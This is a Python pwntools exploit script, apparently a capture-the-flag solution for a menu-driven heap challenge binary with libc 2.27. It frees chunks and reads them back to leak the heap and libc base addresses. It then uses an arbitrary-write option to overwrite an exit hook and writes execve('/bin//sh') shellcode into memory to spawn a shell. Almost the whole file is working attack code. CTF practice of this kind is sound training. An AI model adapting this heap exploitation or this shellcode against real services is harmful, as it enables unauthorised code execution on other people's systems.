#!/usr/bin/env python
#-*- coding:utf-8 -*-

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'pwn'
#libFile = '/lib/x86_64-linux-gnu/libc.so.6'
libFile = './libc-2.27.so'

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(idx, size):
	sla(':', str(1))
	sla(':', str(idx))
	sla(':', str(size))

def rm(idx):
	sla(':', str(4))
	sla(':', str(idx))

def md(idx, data):
	sla(':', str(2))
	sla(':', str(idx))
	sa(':', data)

def dp(idx):
	sla(':', str(3))
	sla(':', str(idx))

def q():
	sla(':', str(5))	

def mad(start_addr):
	sla(':', str(6))	
	sla(':', str(start_addr))	

def mmd(idx, value):
	sla(':', str(7))
	sla('x:', str(idx))
	sla('e:', str(value))

def mrm():
	sla(':', str(8))	

def m_ad_sc(sc):
	while(len(sc) % 4 != 0):
		sc += '\x00'
	sc_len = len(sc)
	li('\n')
	for i in range(sc_len / 4):
		j = i * 4
		s = sc[j : j + 4]
		n = u32(s)
		mmd(i, n)
		li(hex(n))
		

#--------------------------Exploit--------------------------
def exploit():
	li(rl())

	ad(0, 0x100)
	ad(1, 0x100)
	rm(0)
	rm(1)
	ad(0, 0x100)
	dp(0)
	ru(':')
	heap_base = u32(ru('\n')[-4:]) - 0x160
	rm(0)

	# leak libc
	for i in range(9):
		ad(i,0x100)
	for i in range(9):
		rm(i)

	for i in range(8):
		ad(i,0x100)
	md(7, 'AAA\n')
	dp(7)
	libc_base = u32(ru('\xf7')[-3:] + '\xf7') - (0xf7f107d8 - 0xf7d38000)
	libc_got  = libc_base + (0xf7f20000 - 0xf7d48000)
	exit_hook = libc_base + 0x209838
	# p _rtld_global
	# _rtld_lock_unlock_recursive
	# _rtld_lock_lock_recursive

	li('heap_base :' + hex(heap_base))
	li('libc base: ' + hex(libc_base)) 
	li('libc got: ' + hex(libc_got)) 
	li('exit_hook: ' + hex(exit_hook)) 

	mad(libc_base & 0xFFFFFFF)

	midx = (exit_hook - (0xe0000000 + (libc_base & 0xFFFFFFF))) / 4
	maddr = 0xe0000000 + (libc_base & 0xFFFFFFF)

	li('maddr: ' + hex(maddr)) 
	li('hex ' + hex(midx))

	mmd(midx, maddr)

	sc = "\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80"
	m_ad_sc(sc)

	#db()
	q()



def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
